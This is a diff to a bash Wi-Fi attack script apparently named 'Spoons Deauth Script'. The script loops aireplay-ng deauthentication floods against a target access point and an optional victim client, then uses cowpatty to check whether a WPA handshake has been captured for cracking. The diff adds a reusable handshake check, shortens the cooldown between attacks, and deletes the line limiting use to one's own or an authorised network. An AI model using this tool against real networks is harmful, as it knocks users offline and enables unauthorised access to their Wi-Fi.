@@ -5,6 +5,7 @@ GREEN='\033[0;32m'
 ORANGE='\033[1;33m'
 LINE='\033[1;34m'
 GREY='\033[0;37m'
+SUCCESS='\e[48;5;28m'
 NC='\033[0m' #Reset color
 
 #Function to make a bash loop
@@ -15,6 +16,29 @@ function jumpto
     eval "$cmd"
     exit
 }
+
+function checkhandshake
+{
+#Check for a valid handshake
+echo "" && echo -e "\tChecking for a handshake."
+result=$(cowpatty -c -r $cappath)
+
+if [[ $result = *'incomplete'* ]]
+then
+	echo -e " \t ${RED}No successful handshake.${NC}"
+elif [[ $result = *'Collected'* ]]
+then
+	echo -e "\t    ${GREEN}Handshake success!${NC}"
+	status="${GREEN}True${NC}"
+	sleep 5
+	jumpto $finish
+else
+	echo -e "\t  Unexpected response."
+	status="${ORANGE}ERROR${NC}"
+fi
+}
+
+
 start=${1:-"start"}
 finish=${1:-"finish"}
 
@@ -22,8 +46,13 @@ count=0
 
 #Request required info
 clear
-echo "Welcome to Spoons deauth script!"
-echo -e "${RED}This tool is meant for educational purposes only, only use this on your own network or a network where you have explicit permission to do so.${NC}"
+
+echo -e "${ORANGE}  _____                        ____              _   _      _____         _     _   "
+echo " |   __|___ ___ ___ ___ ___   |    \ ___ ___ _ _| |_| |_   |   __|___ ___|_|___| |_ "
+echo " |__   | . | . | . |   |_ -|  |  |  | -_| .'| | |  _|   |  |__   |  _|  _| | . |  _|"
+echo " |_____|  _|___|___|_|_|___|  |____/|___|__,|___|_| |_|_|  |_____|___|_| |_|  _|_|  "
+echo -e "       |_|                                                                 |_|      ${NC}"
+
 echo -e "${GREY}You must be running the following command while using this tool:"
 echo -e "airodump-ng -c (CHANNEL FROM AP) -w (OUTPUT-FILENAME) --bssid (MAC FROM AP) (MONITOR LIKE wlan0mon)${NC}" && echo ""
 
@@ -43,13 +72,32 @@ read cappath
 status="${RED}False${NC}"
 #Timer
 starttime=$SECONDS
+
+#Initial handshake check
+echo "" && echo -e "\tChecking for a handshake..."
+result=$(cowpatty -c -r $cappath)
+
+if [[ $result = *'incomplete'* ]]
+then
+	echo -e " \t  ${RED}No successful handshake.${NC}"
+elif [[ $result = *'Collected'* ]]
+then
+	echo -e "\t  ${GREEN}Handshake success!${NC}"
+	status="${GREEN}True${NC}"
+	sleep 5
+	jumpto $finish
+else
+	echo -e "\t  ${ORANGE}Unexpected response.${NC}"
+	status="${ORANGE}ERROR${NC}"
+fi
+
 #Begin the loop
 jumpto $start
 
 #Box with attack info
 start:
 clear
-echo -e "${LINE}+------------------------------------------------+${NC}"
+echo -e "${LINE}+-------------------------------------------------------+${NC}"
 echo -e "\tAttacking access point:\t$target"
 
 if [[ !  -z  $victim  ]]
@@ -64,39 +112,29 @@ echo -e "\tRuntime:\t\t$duration minutes"
 
 let "count += 1"
 echo -e "\tAttempt: \t\t#$count"
-echo -e "${LINE}+------------------------------------------------+${NC}" && echo ""
+echo -e "${LINE}+-------------------------------------------------------+${NC}" && echo ""
 
 #Attack the entire network and the specific client seperately
-echo -e "\tAttacking the entire network."
+echo -e -ne "\tAttacking the entire network."
 sudo aireplay-ng -0 50 -a $target wlan0 >/dev/null 2>&1
+
+#First check
+checkhandshake
+
+#If a specific victim was assigned
 if [[ !  -z  $victim  ]]
 then
 	echo -e "\t10 Second attack cooldown..."
 	sleep 10
-	echo "" && echo -e "\tAttacking specific user."
+	echo "" && echo -ne -e "\tAttacking specific user."
 	sudo aireplay-ng -0 50 -a $target -c $victim wlan0 >/dev/null 2>&1
+
+	#Second check
+	checkhandshake
 fi
 
-#Check for a valid handshake
-echo "" && echo -e "\tChecking for a handshake..."
-result=$(cowpatty -c -r $cappath)
-
-if [[ $result = *'incomplete'* ]]
-then
-	echo -e " \t  No successful handshake."
-elif [[ $result = *'Collected'* ]]
-then
-	echo -e "\t  Handshake success!"
-	status="${GREEN}True${NC}"
-	sleep 5
-	jumpto $finish
-else
-	echo -e "\t  Unexpected response."
-	status="${ORANGE}ERROR${NC}"
-fi
-
-echo "" && echo -e "\t60 Second attack cooldown..."
-sleep 58
+echo -e "\t10 Second attack cooldown..."
+sleep 8
 echo -e "\tRestarting the attack."
 sleep 2
 
@@ -106,8 +144,8 @@ jumpto $start
 #Give a short attack recap
 finish:
 clear
-echo "                        Recap"
-echo -e "${LINE}+------------------------------------------------+${NC}"
+echo -e "${SUCCESS}‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌Success ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ‌‌ ${NC}"
+echo -e    "${LINE}+-------------------------------------------------------+${NC}"
 echo -e "\tAttacked access point:\t$target"
 
 if [[ !  -z  $victim  ]]
@@ -121,5 +159,4 @@ duration=$((( SECONDS - starttime )/60))
 echo -e "\tRuntime:\t\t$duration minutes"
 
 echo -e "\tAttempts: \t\t$count"
-echo -e "${LINE}+------------------------------------------------+${NC}" && echo ""
-
+echo -e "${LINE}+-------------------------------------------------------+${NC}" && echo ""
